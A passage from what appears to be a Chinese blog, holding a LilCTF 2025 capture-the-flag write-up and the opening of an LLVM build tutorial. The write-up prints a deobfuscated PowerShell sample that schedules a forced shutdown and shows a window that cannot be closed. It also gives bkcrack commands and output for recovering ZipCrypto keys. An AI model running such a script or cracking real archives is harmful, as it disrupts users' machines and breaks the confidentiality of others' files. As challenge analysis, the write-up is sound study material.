class="hljs-variable">$i</span>)  &quot;</span>  |  .<span class="hljs-variable">$r</span><br></code></pre></td></tr></table></figure><p>把这部分内容保存到 payload.txt 中,然后在 PS 中执行<br><code>$payload = Get-Content .\payload.txt -Raw</code></p><blockquote><p>把 payload.txt 文件的所有内容读取到变量 $payload 中<br>  -Raw：读取整个文件为一个完整字符串，而不是按行返回数组</p></blockquote><p><code>$payload = $payload -replace &#39;\$r\s*\(&#39;, &#39;Write-Output(&#39;</code></p><blockquote><p>用 <code>Write-Output(</code> 替换 <code>$r(</code><br><code>-replace</code> 是 PowerShell 的正则替换命令<br><code>\$r\s*\(</code> 是正则表达式：<br><code>\$r</code> 匹配文本 <code>$r</code><br><code>\s*</code> 匹配 <code>$r</code> 和 <code>(</code> 之间可能的空格<br> <code>\(</code> 匹配左括号 <code>(</code></p></blockquote><p><code>Invoke-Expression $payload</code></p><blockquote><p>执行 $payload 变量里的 PowerShell 代码</p></blockquote><p>得到最终 PS 脚本</p><figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$DebugPreference</span> = <span class="hljs-variable">$ErrorActionPreference</span> = <span class="hljs-variable">$VerbosePreference</span> = <span class="hljs-variable">$WarningPreference</span> = <span class="hljs-string">&quot;SilentlyContinue&quot;</span><br><br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Windows.Forms&quot;</span>)<br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Drawing&quot;</span>)<br><br>shutdown /s /t <span class="hljs-number">600</span> &gt;<span class="hljs-variable">$Null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-variable">$Form</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Form<br><span class="hljs-variable">$Form</span>.Text = <span class="hljs-string">&quot;Ciallo～(∠·ω&lt; )⌒★&quot;</span><br><span class="hljs-variable">$Form</span>.StartPosition = <span class="hljs-string">&quot;Manual&quot;</span><br><span class="hljs-variable">$Form</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">40</span>, <span class="hljs-number">40</span>)<br><span class="hljs-variable">$Form</span>.Size = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MinimalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MaximalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.FormBorderStyle = <span class="hljs-string">&quot;FixedDialog&quot;</span><br><span class="hljs-variable">$Form</span>.BackColor = <span class="hljs-string">&quot;#0077CC&quot;</span><br><span class="hljs-variable">$Form</span>.MaximizeBox = <span class="hljs-variable">$False</span><br><span class="hljs-variable">$Form</span>.TopMost = <span class="hljs-variable">$True</span><br><br><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;LILCTF&#123;9dbd4ee5-53a4-4006-9e4e-06fe20d3cf29&#125;&quot;</span><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;N0pe&quot;</span><br><br><br><span class="hljs-variable">$Label1</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label1</span>.Text = <span class="hljs-string">&quot;:)&quot;</span><br><span class="hljs-variable">$Label1</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">80</span>)<br><span class="hljs-variable">$Label1</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label1</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label1</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;Consolas&quot;</span>, <span class="hljs-number">64</span>)<br><br><span class="hljs-variable">$Label2</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label2</span>.Text = <span class="hljs-string">&quot;这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里&quot;</span><br><span class="hljs-variable">$Label2</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">240</span>)<br><span class="hljs-variable">$Label2</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label2</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label2</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Label3</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label3</span>.Text = <span class="hljs-string">&quot;你的电脑将在 10 分钟后关机，请保存你的工作&quot;</span><br><span class="hljs-variable">$Label3</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">300</span>)<br><span class="hljs-variable">$Label3</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label3</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label3</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Form</span>.Controls.AddRange(<span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$Label1</span>, <span class="hljs-variable">$Label2</span>, <span class="hljs-variable">$Label3</span>))<br><br><span class="hljs-variable">$Form</span>.Add_Shown(&#123;<span class="hljs-variable">$Form</span>.Activate()&#125;)<br><span class="hljs-variable">$Form</span>.Add_FormClosing(&#123;<br>    <span class="hljs-variable">$_</span>.Cancel = <span class="hljs-variable">$True</span><br>    [<span class="hljs-type">System.Windows.Forms.MessageBox</span>]::Show(<span class="hljs-string">&quot;不允许关闭！&quot;</span>, <span class="hljs-string">&quot;提示&quot;</span>, [<span class="hljs-type">System.Windows.Forms.MessageBoxButtons</span>]::OK, [<span class="hljs-type">System.Windows.Forms.MessageBoxIcon</span>]::Information)<br>&#125;)<br><br><span class="hljs-variable">$Form</span>.ShowDialog() | <span class="hljs-built_in">Out-Null</span><br></code></pre></td></tr></table></figure><p>flag 为 <code>LILCTF&#123;9dbd4ee5-53a4-4006-9e4e-06fe20d3cf29&#125;</code></p><h3 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h3><p>jadx 打开，在 input 比较的位置看到密文</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* synthetic */</span> <span class="hljs-keyword">void</span> m1729lambda$onCreate$<span class="hljs-number">1</span>$workpangbaiez_asm_hahahaMainActivity(EditText input, Button btn, View v) &#123;<br>     <span class="hljs-type">String</span> <span class="hljs-variable">txt</span> <span class="hljs-operator">=</span> input.getText().toString();<br>     Log.e(<span class="hljs-string">&quot;input1&quot;</span>, txt);<br>     <span class="hljs-type">String</span> <span class="hljs-variable">enc</span> <span class="hljs-operator">=</span> check(txt);<br>     Log.e(<span class="hljs-string">&quot;input&quot;</span>, enc);<br>     <span class="hljs-keyword">if</span> (enc.equals(<span class="hljs-string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span>)) &#123;<br>         Snackbar.make(btn, <span class="hljs-string">&quot;U W1n Th3 G@m3 (:&quot;</span>, -<span class="hljs-number">1</span>).show();<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         Snackbar.make(btn, <span class="hljs-string">&quot;喵喵喵，不对呢 &gt;_&lt;&quot;</span>, -<span class="hljs-number">1</span>).show();<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>密文为 <code>KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S</code></p><p>然后导出 so 文件，看到 check 函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall Java_work_pangbai_ez_1asm_1hahaha_MainActivity_check(_JNIEnv *a1, __int64 a2, __int64 a3)<br>&#123;<br>  size_t v3; // x0<br> <span class="hljs-built_in"> const </span>char *p_n2; // x10<br>  int8x16_t v5; // q0<br> <span class="hljs-built_in"> int </span>v6; // w0<br> <span class="hljs-built_in"> int </span>n47; // [xsp+2Ch] [xbp-1D4h]<br> <span class="hljs-built_in"> int </span>n2; // [xsp+7Ch] [xbp-184h]<br>  int8x16_t t; // [xsp+A0h] [xbp-160h]<br>  char *v11; // [xsp+B8h] [xbp-148h]<br>  __int64 v13; // [xsp+E0h] [xbp-120h]<br> <span class="hljs-built_in"> const </span>char *StringUTFChars; // [xsp+110h] [xbp-F0h]<br>  char n2_1; // [xsp+1E7h] [xbp-19h] BYREF<br>  char *v16; // [xsp+1E8h] [xbp-18h] BYREF<br>  char v17; // [xsp+1F7h] [xbp-9h] BYREF<br>  __int64 v18; // [xsp+1F8h] [xbp-8h]<br><br>  v18 = *(_QWORD *)(_ReadStatusReg(TPIDR_E<span class="hljs-class">L0) + 40);</span><br>  v17 = 0;<br>  StringUTFChars = (const char *)_JNIEnv::GetStringUTFChars(a1, a3, &amp;v17);<br>  v3 = __strlen_chk(StringUTFChars, 0xFFFFFFFFFFFFFFFF<span class="hljs-class">LL);</span><br>  v11 = (char *)malloc(v3 + 1);<br>  __strcpy_chk(v11, StringUTFChars, -1);<br> <span class="hljs-built_in"> if </span>( __strlen_chk(v11, 0xFFFFFFFFFFFFFFFFLL) == 48 )<br>  &#123;<br>    t = (int8x16_t)::t;<br>    for ( n2 = 0; n2 &lt;= 2; ++n2 )<br>    &#123;<br>      *(int8x16_t *)&amp;v11[16 * n2] = veorq_s8(vqtbl1q_s8(*(int8x16_t *)&amp;v11[16 * n2], t), t);<br>      n2_1 = n2;<br>      p_n2 = &amp;n2_1;<br>      v5 = vld1q_dup_s8(p_n2);<br>      t = veorq_s8(t, v5);<br>      __android_log_print(6, <span class="hljs-string">&quot;========= Error =========   &quot;</span>, <span class="hljs-string">&quot;%s&quot;</span>, v11);<br>    &#125;<br>    __android_log_print(6, <span class="hljs-string">&quot;========= Error =========   &quot;</span>, <span class="hljs-string">&quot;%s&quot;</span>, v11);<br>    for ( n47 = 0; n47 &lt;= 47; n47 += 3 )<br>    &#123;<br>      v11[n47] = ((unsigned __int8)v11[n47] &gt;&gt; 5) | (8 * v11[n47]);<br>      v11[n47 + 1] = ((unsigned __int8)v11[n47 + 1] &gt;&gt; 1) | (v11[n47 + 1] &lt;&lt; 7);<br>      v11[n47 + 2] = v11[n47 + 2];<br>    &#125;<br>    v6 = __strlen_chk(v11, 0xFFFFFFFFFFFFFFFF<span class="hljs-class">LL);</span><br>    encodeBase64(v11, v6, &amp;v16);<br>    __android_log_print(6, <span class="hljs-string">&quot;========= Error =========   &quot;</span>, <span class="hljs-string">&quot;%s&quot;</span>, v11);<br>    v13 = _JNIEnv::NewStringUTF(a1, v16);<br>  &#125;<br>  else<br>  &#123;<br>    v13 = _JNIEnv::NewString(a1, word_86B, 3);<br>  &#125;<br>  _ReadStatusReg(TPIDR_E<span class="hljs-class">L0);</span><br> <span class="hljs-built_in"> return </span>v13;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要逻辑：<br>获取字符串</p><p>检查长度是否为 <strong>48</strong></p><p>NEON 向量加密：初始化向量t从全局变量::t（16字节）<br>循环3次（每次处理16字节块）：<br>对每个块使用 vqtbl1q_s8 进行表查找（置换），然后与t异或<br>更新t：t &#x3D; t XOR (n2重复16次)，其中n2是循环索引（0,1,2）<br>其中块0和块1使用相同的t值（初始T0）块2使用t &#x3D; T0 XOR 1_vector</p><p>对每三个字节进行操作：<br>第一个字节：循环左移3位（(x &gt;&gt; 5) | (x &lt;&lt; 3)）<br>第二个字节：循环右移1位（(x &gt;&gt; 1) | (x &lt;&lt; 7)）<br>第三个字节：不变</p><p>Base64编码：变表</p><p>关键数据</p><p><img src="/../images/LilCTF2025/a1.png"></p><p>解密脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">byte, count</span>):<br>    <span class="hljs-keyword">return</span> ((byte &lt;&lt; count) | (byte &gt;&gt; (<span class="hljs-number">8</span> - count))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">byte, count</span>):<br>    <span class="hljs-keyword">return</span> ((byte &gt;&gt; count) | (byte &lt;&lt; (<span class="hljs-number">8</span> - count))) &amp; <span class="hljs-number">0xFF</span><br><br>encrypted_str = <span class="hljs-string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span><br>custom_b64_alphabet = <span class="hljs-string">b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span><br>standard_b64_alphabet = <span class="hljs-string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>translation_table = <span class="hljs-built_in">bytes</span>.maketrans(custom_b64_alphabet, standard_b64_alphabet)<br>standard_b64_str = encrypted_str.translate(translation_table)<br>decoded_data = base64.b64decode(standard_b64_str)<br>data_list = <span class="hljs-built_in">list</span>(decoded_data)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">3</span>):<br>    data_list[i] = ror(data_list[i], <span class="hljs-number">3</span>)<br>    data_list[i+<span class="hljs-number">1</span>] = rol(data_list[i+<span class="hljs-number">1</span>], <span class="hljs-number">1</span>)<br><br>t_initial = [<span class="hljs-number">0xD</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]<br>t_for_block = &#123;&#125;<br>t_for_block[<span class="hljs-number">0</span>] = <span class="hljs-built_in">list</span>(t_initial)<br>t_for_block[<span class="hljs-number">1</span>] = <span class="hljs-built_in">list</span>(t_initial)<br>t_for_block[<span class="hljs-number">2</span>] = [val ^ <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> t_initial]<br><br>decrypted_data = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    t_current = t_for_block[i]<br>    rev_t = &#123;val: idx <span class="hljs-keyword">for</span> idx, val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(t_current)&#125;<br>    block_start = i * <span class="hljs-number">16</span><br>    encrypted_block = data_list[block_start : block_start + <span class="hljs-number">16</span>]<br>    decrypted_block = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        k = rev_t[j]<br>        decrypted_block[j] = encrypted_block[k] ^ t_current[k]<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        decrypted_data[block_start + k] = decrypted_block[k]<br><br>flag = <span class="hljs-built_in">bytes</span>(decrypted_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>flag 为<code>LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="提前放出附件"><a href="#提前放出附件" class="headerlink" title="提前放出附件"></a>提前放出附件</h3><p>附件只给了一个压缩包，且是 ZipCrypto ，里面是一个加密的 flag.tar,用 <strong>bkcrack</strong> 进行明文攻击<br>用 010 editor 观察了多个 tar 文件，发现有相似结构，从第 16 字节开始，有 16 个全零字节，找到明文，开始爆破<br>用指令 <code>.\bkcrack -C 231917_misc-public-ahead.zip -c flag.tar -x 16 00000000000000000000000000000000</code><br>得到 key</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">21:06:58</span>] Z reduction <span class="hljs-keyword">using</span> <span class="hljs-number">8</span> bytes of known plaintext<br><span class="hljs-number">100.0</span> % (<span class="hljs-number">8</span> / <span class="hljs-number">8</span>)<br>[<span class="hljs-meta">21:06:58</span>] Attack <span class="hljs-keyword">on</span> <span class="hljs-number">775242</span> Z values at index <span class="hljs-number">23</span><br>Keys: <span class="hljs-number">945815e7</span> <span class="hljs-number">4e7</span>a2163 e46b8f88<br><span class="hljs-number">0.8</span> % (<span class="hljs-number">5918</span> / <span class="hljs-number">775242</span>)<br>[<span class="hljs-meta">21:07:01</span>] Keys<br><span class="hljs-number">945815e7</span> <span class="hljs-number">4e7</span>a2163 e46b8f88<br></code></pre></td></tr></table></figure><p>继续执行 <code>.\bkcrack -C 231917_misc-public-ahead.zip -k 945815e7 4e7a2163 e46b8f88 -U flag.zip aaa</code><br>生成 flag.zip，内容结构与原包相同，但对应的 ZipCrypto 条目现在用 aaa 就能打开<br>里面有 flag.txt,得到 <code>LILCTF&#123;Z1pCRyp70_1s_n0t_5ecur3&#125;</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>llvm 浅探</title>
    <link href="/2025/08/01/llvm/"/>
    <url>/2025/08/01/llvm/</url>
    
    <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>这篇文章的前半部分包括写的环境搭建都是基于 LLVM 源码的构建方式，重点在于帮助了解 llvm 的结构，如果目的只是编写 Pass 的话，直接跳到 <strong>自己编写 LLVM Pass</strong> 部分即可</p><h4 id="LLVM-环境搭建"><a href="#LLVM-环境搭建" class="headerlink" title="LLVM 环境搭建"></a>LLVM 环境搭建</h4><p>由于我的 Ubuntu 版本不够，无法直接 apt install llvm-20,所以就去 <a href="https://github.com/llvm/llvm-project.git">https://github.com/llvm/llvm-project.git</a> 里面下载了源码，解压到 wsl 下</p><p>更新包列表<br><code>sudo apt-get update</code></p><p>安装基础编译工具（包含g++, make等）<br><code>sudo apt-get install build-essential</code></p><p>安装 CMake<br><code>sudo apt-get install cmake</code></p><p>安装 Ninja<br><code>sudo apt-get install ninja-build</code></p><p>安装 Clang<br><code>sudo apt-get install clang</code></p><p>安装其他依赖<br><code>sudo apt-get install python3 zlib1g-dev libtinfo-dev</code></p><p>进入 llvm 源码目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span>  llvm-project-llvmorg-<span class="hljs-number">20</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>配置并生成构建文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cmake -S <span class="hljs-keyword">llvm </span>-<span class="hljs-keyword">B </span><span class="hljs-keyword">build </span>-G Ninja -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_PROJECTS=<span class="hljs-string">&quot;clang&quot;</span><br></code></pre></td></tr></table></figure><p>进入 build 目录,并行使用 8 个线程进行构建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> build<br>ninja -j8<br></code></pre></td></tr></table></figure><p>把 llvm 源码导入 CLion 中，找到 llvm-project-llvmorg-20.1.8\llvm 目录下的 CMakeLists.txt，打开<br>在设置里的 构造、执行、部署 中点开 CMake，点 + 添加，在 CMake 选项中输入之前的命令<br><code>cmake -S llvm -B build -G Ninja -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_PROJECTS=&quot;clang&quot;</code>,<br>确认后发现多了两个文件夹 cmake-build-debug 和 cmake-build-release，然后 ninja -j8 编译，但是我这里好像是因为当前执行命令的目录路径 (&#x2F;home&#x2F;eleven&#x2F;…) 和它在 CMakeCache.txt 文件中记录的路径 (&#x2F;&#x2F;wsl.localhost&#x2F;Ubuntu&#x2F;home&#x2F;eleven&#x2F;…) 不一致，编译失败了，然后就删了重新构建一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/llvm-project-llvmorg-20.1.8/llvm/cmake-build-release<br><span class="hljs-built_in">rm</span> -rf CMakeCache.txt CMakeFiles/<br>cmake .. -G Ninja -DCMAKE_BUILD_TYPE=Release<br>ninja -j8<br></code></pre></td></tr></table></figure><h3 id="LLVM-tool"><a href="#LLVM-tool" class="headerlink" title="LLVM tool"></a>LLVM tool</h3><p><a href="https://llvm.org/docs/GettingStarted.html#llvm-tools">https://llvm.org/docs/GettingStarted.html#llvm-tools</a><br>先编写一个简单的 c 语言脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ez.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, LLVM!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用 clang 编译<br><code>clang ez.c -o ez</code></p><blockquote><p>clang 默认方式与 GCC 相同，标准 -S 和 -c 参数分别生成 .s 和 .o 文件</p></blockquote><p>把 c 源代码编译成 LLVM IR<br><code>clang -emit-llvm -S ez.c -o ez.ll</code></p><blockquote><p>-emit-llvm 告诉编译器不要生成机器码（如 .o 或可执行文件），而是生成 LLVM IR<br>-S 告诉编译器，生成的 LLVM IR 应该以文本格式输出，而不是默认的二进制字节码格式<br>.ll 文件是人类可读的文本文件</p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-comment">; ModuleID = &#x27;ez.c&#x27;</span><br>source_filename <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ez.c&quot;</span><br><span class="hljs-keyword">target</span> <span class="hljs-keyword">datalayout</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-i128:128-f80:128-n8:16:32:64-S128&quot;</span><br><span class="hljs-keyword">target</span> <span class="hljs-keyword">triple</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;x86_64-pc-linux-gnu&quot;</span><br><br><span class="hljs-title">@.str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">unnamed_addr</span> <span class="hljs-keyword">constant</span> [<span class="hljs-number">14</span> <span class="hljs-keyword">x</span> <span class="hljs-type">i8</span>] <span class="hljs-keyword">c</span><span class="hljs-string">&quot;Hello, LLVM!\0A<span class="hljs-char escape_">\00</span>&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">1</span><br><br><span class="hljs-comment">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="hljs-keyword">define</span> dso_local <span class="hljs-type">i32</span> <span class="hljs-title">@main</span>() <span class="hljs-variable">#0</span> &#123;<br>  <span class="hljs-variable">%1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> 